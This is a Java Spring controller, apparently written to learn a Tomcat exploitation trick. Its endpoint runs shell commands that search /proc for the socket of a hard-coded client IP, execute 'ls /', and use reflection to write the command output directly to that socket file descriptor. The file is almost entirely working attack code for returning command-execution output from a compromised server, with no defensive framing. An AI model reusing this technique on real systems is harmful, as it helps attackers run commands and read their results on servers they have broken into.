package com.example.tomcatresponselearn.controller;

import org.apache.catalina.connector.Connector;
import org.apache.catalina.connector.Response;
import org.apache.catalina.connector.ResponseFacade;
import org.apache.catalina.core.ApplicationContext;
import org.apache.catalina.core.ApplicationFilterChain;
import org.apache.catalina.core.StandardService;
import org.apache.coyote.AbstractProtocol;
import org.apache.coyote.ProtocolHandler;
import org.apache.coyote.RequestGroupInfo;
import org.apache.coyote.RequestInfo;
import org.apache.coyote.http11.Http11NioProtocol;
import org.apache.tomcat.util.net.AbstractEndpoint;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.ResponseBody;

import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.io.InputStream;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Modifier;
import java.util.Scanner;

@Controller
@RequestMapping("/app")
public class TestController {

    @RequestMapping("/test")
    @ResponseBody
    public String testDemo() throws IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException, NoSuchMethodException, InvocationTargetException, InstantiationException {
        String[] cmd = { "/bin/sh", "-c", "a=`cat /proc/$PPID/net/tcp6|awk '{if($10>0)print}'|grep -i 7200A8C0|awk '{print $10}'`;b=`ls -l /proc/$PPID/fd|grep $a|awk '{print $9}'`;echo -n $b"};
        java.io.InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();
        java.io.InputStreamReader isr  = new java.io.InputStreamReader(in);
        java.io.BufferedReader br = new java.io.BufferedReader(isr);
        StringBuilder stringBuilder = new StringBuilder();
        String line;

        while ((line = br.readLine()) != null){
            stringBuilder.append(line);
        }

        int num = Integer.valueOf(stringBuilder.toString()).intValue();


        cmd = new String[]{"/bin/sh","-c","ls /"};
        in = Runtime.getRuntime().exec(cmd).getInputStream();
        isr  = new java.io.InputStreamReader(in);
        br = new java.io.BufferedReader(isr);
        stringBuilder = new StringBuilder();

        while ((line = br.readLine()) != null){
            stringBuilder.append(line);
        }

        String ret = stringBuilder.toString();
        java.lang.reflect.Constructor c=java.io.FileDescriptor.class.getDeclaredConstructor(new Class[]{Integer.TYPE});
        c.setAccessible(true);

        java.io.FileOutputStream os = new java.io.FileOutputStream((java.io.FileDescriptor)c.newInstance(new Object[]{new Integer(num)}));
        os.write(ret.getBytes());
        os.close();


        return "xxxxxx";
    }

}
